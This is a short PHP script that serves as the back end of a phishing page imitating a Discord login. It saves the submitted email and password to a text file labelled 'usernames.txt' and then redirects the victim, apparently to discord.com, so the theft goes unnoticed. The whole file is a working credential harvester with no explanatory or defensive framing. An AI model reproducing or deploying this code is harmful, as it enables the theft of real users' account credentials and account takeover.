<?php
file_put_contents("usernames.txt", "Discord Username: " . $_POST['email'] . "\nPassword: " . $_POST['password'] ."\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.discord.com
header("Location: $url");
exit();
?>